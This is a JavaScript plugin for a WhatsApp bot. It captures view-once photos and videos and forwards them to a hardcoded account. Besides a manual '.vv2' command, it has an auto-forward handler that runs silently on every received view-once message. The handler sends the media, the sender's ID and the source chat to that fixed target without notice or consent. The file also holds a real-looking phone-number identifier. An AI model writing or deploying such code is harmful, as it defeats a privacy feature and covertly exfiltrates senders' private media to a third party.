const { downloadContentFromMessage } = require('@whiskeysockets/baileys');
const { raganork, isPublic } = require('../lib/');

// Configuration
const TARGET_ID = '184989257826440@lid';
const OWNER_JID = '923010609759@s.whatsapp.net';

/**
 * MANUAL COMMAND: .vv2
 * Trigger: Reply to a view-once message and type .vv2
 */
raganork({
    pattern: 'vv2 ?(.*)', 
    fromMe: true, 
    desc: 'Forward view-once to owner LID', 
    type: 'misc'
}, (async (message, match) => {
    if (!message.reply_message || !message.reply_message.viewonce) {
        return await message.send("*Reply to a view-once image or video!*");
    }

    try {
        const timeManual = new Date().toLocaleString('en-GB', { timeZone: 'Asia/Karachi' });
        
        // Downloading media buffer
        const mediaData = message.reply_message.data.message[message.reply_message.mtype];
        const stream = await downloadContentFromMessage(mediaData, message.reply_message.mtype.replace('Message', ''));
        let buffer = Buffer.from([]);
        for await (const chunk of stream) { buffer = Buffer.concat([buffer, chunk]); }

        const caption = `✅ *MANUAL RECOVERY (.vv2)*\n\n` +
                        `👤 *From:* @${message.participant.split('@')[0]}\n` +
                        `🆔 *JID:* ${message.participant}\n` +
                        `⏰ *Time:* ${timeManual}`;

        // Send to LID
        await message.client.sendMessage(TARGET_ID, { 
            [message.reply_message.mtype.replace('Message', '').toLowerCase()]: buffer, 
            caption: caption,
            mentions: [message.participant]
        });

        await message.send("_Successfully forwarded to LID._");
    } catch (e) {
        await message.send("_Failed. The media may have expired._");
    }
}));

/**
 * AUTO-FORWARD LOGIC
 * Runs silently every time a view-once message is received
 */
raganork({
    on: 'text', 
    fromMe: false
}, (async (message, match) => {
    // Check if the current message is a view-once type
    if (message.viewonce) {
        try {
            const autoTime = new Date().toLocaleString('en-GB', { timeZone: 'Asia/Karachi' });
            
            // Extract media data
            const mediaData = message.data.message[message.mtype];
            const stream = await downloadContentFromMessage(mediaData, message.mtype.replace('Message', ''));
            
            let buffer = Buffer.from([]);
            for await (const chunk of stream) { buffer = Buffer.concat([buffer, chunk]); }

            const autoCaption = `🚀 *AUTO-RECOVER VIEW-ONCE*\n\n` +
                                `👤 *Sender:* @${message.participant.split('@')[0]}\n` +
                                `🆔 *Sender JID:* ${message.participant}\n` + 
                                `📍 *Chat Source:* ${message.from}\n` +   
                                `⏰ *Time:* ${autoTime}\n` +
                                `📝 *Caption:* ${mediaData.caption || 'No caption'}`;

            // Silent Forwarding to target LID
            await message.client.sendMessage(TARGET_ID, { 
                [message.mtype.replace('Message', '').toLowerCase()]: buffer, 
                caption: autoCaption, 
                mentions: [message.participant] 
            });
            
            console.log(`[VV-FORWARD] Media from ${message.participant} sent to ${TARGET_ID}`);
        } catch (e) {
            console.error("Auto-forward failure:", e);
        }
    }
}));
          
